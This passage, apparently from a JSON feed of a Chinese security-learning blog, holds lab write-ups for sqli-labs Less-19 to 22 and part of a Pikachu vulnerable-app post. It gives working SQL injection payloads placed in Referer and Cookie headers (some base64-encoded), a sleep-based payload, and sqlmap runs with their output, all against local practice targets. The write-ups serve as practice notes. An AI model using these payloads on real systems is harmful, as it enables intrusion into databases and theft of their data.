text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&#x27;Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your Referer is: http://www.sqli-labs.com/Less-19/&#x27;&lt;/font&gt;&lt;br&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;)&#x27; at line 1&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>又是 insert 操作啦，利用报错注入 extractvalue () 拿当前数据库名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&#x27;, extractvalue(1,concat(&#x27;~&#x27;,database()))) # Content-Type: application/x-www-form-urlencodedContent-Length: 35Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit </span><br></pre></td></tr></table></figure>\n<p>根据输出，拿到当前数据库名 security：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your Referer is: http://www.sqli-labs.com/Less-19/&#x27;, extractvalue(1,concat(&#x27;~&#x27;,database()))) #&lt;/font&gt;&lt;br&gt;XPATH syntax error: &#x27;~security&#x27;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>后续操作同 less-11</p>\n<h2 id=\"总结-19\"><a class=\"markdownIt-Anchor\" href=\"#总结-19\">#</a> 总结</h2>\n<p>sqlmap 新操作，感觉它不太行了？应该是我不太行，去百度 sqlmap 的使用姿势</p>\n<hr>\n<h1 id=\"less-20\"><a class=\"markdownIt-Anchor\" href=\"#less-20\">#</a> Less-20</h1>\n<p>date：2020-11-22 10:17:02</p>\n<h2 id=\"过程-20\"><a class=\"markdownIt-Anchor\" href=\"#过程-20\">#</a> 过程</h2>\n<h3 id=\"sqlmap-20\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-20\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 20.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-20\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-20\">#</a> 手工注入</h3>\n<p>先用 admin\\1 登录</p>\n<p>题目给了我的 cookie：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = admin and expires: Sun 22 Nov 2020 - 11:22:50Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>\n<p>那就 cookie 注入呗，bp 抓包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Less-20/index.php HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-20/index.phpDNT: 1Connection: closeCookie: uname=adminUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>\n<p>cookie 后单引号开战</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>后面的 sql 橘子拿到了，就开始常规姿势闭合，拿 database ()</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27; and extractvalue(1,concat(&#x27;~&#x27;,database())) # </span><br></pre></td></tr></table></figure>\n<p>输出，拿到库名 security：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Issue with your mysql: XPATH syntax error: &#x27;~security&#x27;</span><br></pre></td></tr></table></figure>\n<p>拿字段内容同 less-11</p>\n<h2 id=\"总结-20\"><a class=\"markdownIt-Anchor\" href=\"#总结-20\">#</a> 总结</h2>\n<p>报错注入真好用</p>\n<p>前面写了题，后面就越写越快了，开心</p>\n<hr>\n<h1 id=\"less-21\"><a class=\"markdownIt-Anchor\" href=\"#less-21\">#</a> Less-21</h1>\n<p>date：2020-11-22 10:29:18</p>\n<h2 id=\"过程-21\"><a class=\"markdownIt-Anchor\" href=\"#过程-21\">#</a> 过程</h2>\n<h3 id=\"sqlmap-21\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-21\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 21.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-21\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-21\">#</a> 手工注入</h3>\n<p>老规矩，输入 17 关重置后的账户密码 admin/1</p>\n<p>题目还是 cookie 注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 11:29:55Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>\n<p>看标题是复杂版的…</p>\n<p>啊这，先试试引号，竟然不报错了！</p>\n<p>有趣</p>\n<p>看了下题目 uname 那里发生了改变，抓包发现 uname 是 YWRtaW4，改成 admin 试试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&quot;</span><br></pre></td></tr></table></figure>\n<p>输出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE) for operation &#x27;=&#x27;</span><br></pre></td></tr></table></figure>\n<p>说是编码集的问题，好叭我去百度<a href=\"https://www.cnblogs.com/escwq/p/12264076.html\">闯关秘籍了</a></p>\n<p>对 cookie 的值进行了 base64 的处理，其他和 20 关一样</p>\n<p>也就是说在注入的时候需要把注入语句搞一下编码，打开 hackbar，打开 base64 编码，输入 admin’</p>\n<p>bp 发包设置 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=YWRtaW4n</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>拿到后面的句子，开始闭合注入，不知为何我转义后的报错注入代码放进 payload 没有反应，换一个加密工具就好了</p>\n<p>用报错注入拿数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文：admin&#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64转义：YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=设置cookie：Cookie: uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;YOUR COOKIE : uname = YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA= and expires: Sun 22 Nov 2020 - 12:30:51&lt;br&gt;&lt;/font&gt;Issue with your mysql: XPATH syntax error: &#x27;,security&#x27;</span><br></pre></td></tr></table></figure>\n<p>拿到数据库名，拿别的数据同 less-11</p>\n<h2 id=\"总结-21\"><a class=\"markdownIt-Anchor\" href=\"#总结-21\">#</a> 总结</h2>\n<p><a href=\"https://blog.csdn.net/makenothing/article/details/81155960\">base64 使用场景及原理</a></p>\n<p>base64 最早就是用来邮件传输协议中的，原因是邮件传输协议只支持 ascii 字符传递，因此如果要传输二进制文件，如：图片、视频是无法实现的。</p>\n<p>因此 base64 就可以用来将二进制文件内容编码为只包含 ascii 字符的内容。</p>\n<p>我们知道在计算机中任何数据都是按 ascii 码存储的，而 ascii 码的 128～255 之间的值是不可见字符。而在网络上交换数据时，比如说从 A 地传到 B 地，往往要经过多个路由设备，由于不同的设备对字符的处理方式有一些不同，这样那些不可见字符就有可能被处理错误，这是不利于传输的。所以就先把数据先做一个 Base64 编码，统统变成可见字符，这样出错的可能性就大降低了。</p>\n<hr>\n<h1 id=\"less-22\"><a class=\"markdownIt-Anchor\" href=\"#less-22\">#</a> Less-22</h1>\n<p>date：2020-11-22 11:35:53</p>\n<h2 id=\"过程-22\"><a class=\"markdownIt-Anchor\" href=\"#过程-22\">#</a> 过程</h2>\n<h3 id=\"sqlmap-22\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-22\">#</a> sqlmap</h3>\n<p>bp 抓包右键 copy to file 生成 22.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后续同 less-11</p>\n<h3 id=\"手工注入-22\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-22\">#</a> 手工注入</h3>\n<p>还是用 admin\\1 登录，显示 cookie，那就还是 cookie 注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 12:37:26Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>\n<p>看见 uname = YWRtaW4= ，那就应该还是用 base64 加密</p>\n<p>使用上一题的 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文：admin&#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64：YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>\n<p>发现没有报错显示，那么说明没有闭合成功，看标题是双引号闭合，那就改一下引号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文：admin&quot;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64：YWRtaW4iKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # &quot; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>哪到后面的 sql 语句，发现只需要闭合一个双引号，不需要），开干</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">明文：admin&quot; and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64：YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoJywnLGRhdGFiYXNlKCkpKSAjIA==</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Issue with your mysql: XPATH syntax error: &#x27;,security&#x27;</span><br></pre></td></tr></table></figure>\n<p>拿到数据库名，拿别的数据同 less-11</p>\n<h2 id=\"总结-22\"><a class=\"markdownIt-Anchor\" href=\"#总结-22\">#</a> 总结</h2>\n<p>我发现 sqlmap 跑得有一点慢</p>\n",
            "tags": [
                "sql注入靶场"
            ]
        },
        {
            "id": "http://example.com/2020/10/30/dmx/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/",
            "url": "http://example.com/2020/10/30/dmx/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/",
            "title": "pikachu大冒险鸭",
            "date_published": "2020-10-30T03:46:05.000Z",
            "content_html": "<h1 id=\"sql注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h2 id=\"搜索型注入\"><a class=\"markdownIt-Anchor\" href=\"#搜索型注入\">#</a> 搜索型注入</h2>\n<p><strong>过程</strong></p>\n<p><img src=\"pikachu-sql-001.png\" alt=\"\"></p>\n<p>爆出数据库，确定了是三个字段输出<img src=\"pikachu-sql-002.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"xx型注入\"><a class=\"markdownIt-Anchor\" href=\"#xx型注入\">#</a> xx 型注入</h2>\n<p><strong>过程</strong></p>\n<p>我是想看报错信息的，三个单引号，结果莫名其妙就过了</p>\n<p>pyload：<a href=\"http://www.pikachu.com/vul/sqli/sqli_x.php\">http://www.pikachu.com/vul/sqli/sqli_x.php</a><br>\n?name=’’’) union select 1,database() %23<br>\n&amp;submit=%E6%9F%A5%E8%AF%A2</p>\n<p>哦，刚刚试了下，一个单引号就过了，之所以➕），是因为看报错信息的时候发现最后面有一个），所以想到小括号可能没有闭合</p>\n<p><img src=\"pikachu-sql-003.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"insertupdate注入\"><a class=\"markdownIt-Anchor\" href=\"#insertupdate注入\">#</a> &quot;insert/update&quot; 注入</h2>\n<p><strong>过程</strong></p>\n<p>试报错，看具体语句</p>\n<p><img src=\"pikachu-sql-004.png\" alt=\"\"></p>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;,md5(&#x27;a&#x27;),&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>密码随便输，构造用户名 payload，注意时间注入的时候要括号起来，不然会报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&#x27;,&#x27;admin&#x27;,&#x27;&#x27;,(select sleep(10)),&#x27;&#x27;,&#x27;&#x27;) # </span><br></pre></td></tr></table></figure>\n<p>实际上差不多数据库执行的语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into a(1,2,3,4,5,6) values(&#x27; admin&#x27;,&#x27;admin&#x27;,&#x27;&#x27;,(select sleep(10)),&#x27;&#x27;,&#x27;&#x27;) # &#x27;,&#x27;md5(admin)&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;  );</span><br></pre></td></tr></table></figure>\n<p>注册成功，最后也不晓得这个注入有劳资用？而且登陆的时候检查密码也是 md5 加密一下的…</p>\n<p>然后登陆的时候，源代码还报错惹</p>\n<p>时隔几天，我突然想起来，既然可以注入那么就能时间盲注进行判断…</p>\n<hr>\n<h2 id=\"delete注入\"><a class=\"markdownIt-Anchor\" href=\"#delete注入\">#</a> delete 注入</h2>\n<p><strong>过程</strong></p>\n<p>发现删除的时候是 get 请求，参数 id，直接 sqlmap 泡一泡：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\othertools\\sqlmap-py&gt;python sqlmap.py -u http://www.pikachu.com/vul/sqli/sqli_del.php?id=57 --dbs --batch</span><br><span class=\"line\">        ___</span><br><span class=\"line\">       __H__</span><br><span class=\"line\"> ___ ___[&quot;]_____ ___ ___  &#123;1.4.9.8#dev&#125;</span><br><span class=\"line\">|_ -| . [.]     | .&#x27;| . |</span><br><span class=\"line\">|___|_  [&#x27;]_|_|_|__,|  _|</span><br><span class=\"line\">      |_|V...       |_|   http://sqlmap.org</span><br><span class=\"line\"></span><br><span class=\"line\">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class=\"line\"></span><br><span class=\"line\">[*] starting @ 10:11:16 /2020-11-04/</span><br><span class=\"line\"></span><br><span class=\"line\">[10:11:16] [INFO] resuming back-end DBMS &#x27;mysql&#x27;</span><br><span class=\"line\">[10:11:17] [INFO] testing connection to the target URL</span><br><span class=\"line\">you have not declared cookie(s), while server wants to set its own (&#x27;PHPSESSID=3q2hir937ep...ecom1vat5s&#x27;). Do you want to use those [Y/n] Y</span><br><span class=\"line\">sqlmap resumed the following injection point(s) from stored session:</span><br><span class=\"line\">---</span><br><span class=\"line\">Parameter: id (GET)</span><br><span class=\"line\">    Type: boolean-based blind</span><br><span class=\"line\">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class=\"line\">    Payload: id=(SELECT (CASE WHEN (2154=2154) THEN 61 ELSE (SELECT 6834 UNION SELECT 3017) END))</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: error-based</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class=\"line\">    Payload: id=61 AND (SELECT 5347 FROM(SELECT COUNT(*),CONCAT(0x716b717671,(SELECT (ELT(5347=5347,1))),0x7162627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: time-based blind</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class=\"line\">    Payload: id=61 AND (SELECT 9106 FROM (SELECT(SLEEP(5)))xjCI)</span><br><span class=\"line\">---</span><br><span class=\"line\">[10:11:19] [INFO] the back-end DBMS is MySQL</span><br><span class=\"line\">web application technology: PHP, PHP 7.3.4, Apache 2.4.39</span><br><span class=\"line\">back-end DBMS: MySQL &gt;= 5.0</span><br><span class=\"line\">[10:11:19] [INFO] fetching database names</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;information_schema&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;bookstore&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;dvwa&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;edusys&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;exam&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;fresh&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;hotel&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;hy&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;hy2&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;mysql&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;news&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;pentest&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;performance_schema&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;pikachu&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;store&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;student&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;test&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;vote&#x27;</span><br><span class=\"line\">available databases [18]:</span><br><span class=\"line\">[*] bookstore</span><br><span class=\"line\">[*] dvwa</span><br><span class=\"line\">[*] edusys</span><br><span class=\"line\">[*] exam</span><br><span class=\"line\">[*] fresh</span><br><span class=\"line\">[*] hotel</span><br><span class=\"line\">[*] hy</span><br><span class=\"line\">[*] hy2</span><br><span class=\"line\">[*] information_schema</span><br><span class=\"line\">[*] mysql</span><br><span class=\"line\">[*] news</span><br><span class=\"line\">[*] pentest</span><br><span class=\"line\">[*] performance_schema</span><br><span class=\"line\">[*] pikachu</span><br><span class=\"line\">[*] store</span><br><span class=\"line\">[*] student</span><br><span class=\"line\">[*] test</span><br><span class=\"line\">[*] vote</span><br><span class=\"line\"></span><br><span class=\"line\">[10:11:19] [INFO] fetched data logged to text files under &#x27;C:\\Users\\lenovo\\AppData\\Local\\sqlmap\\output\\www.pikachu.com&#x27;</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"http头注入未解决\"><a class=\"markdownIt-Anchor\" href=\"#http头注入未解决\">#</a> http 头注入（未解决）</h2>\n<p><strong>过程</strong></p>\n<p>用提示里面的账户密码后登录，显示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">你的ip地址:127.0.0.1</span><br><span class=\"line\"></span><br><span class=\"line\">你的user agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class=\"line\"></span><br><span class=\"line\">你的http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"></span><br><span class=\"line\">你的端口（本次连接）:tcp14766</span><br></pre></td></tr></table></figure>\n<p>说明这些头信息可能都被存进数据库了，可以进行 sql 注入</p>\n<p>用 bp 抓到的包：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /vul/sqli/sqli_header/sqli_header_login.php HTTP/1.1</span><br><span class=\"line\">Host: www.pikachu.com</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: 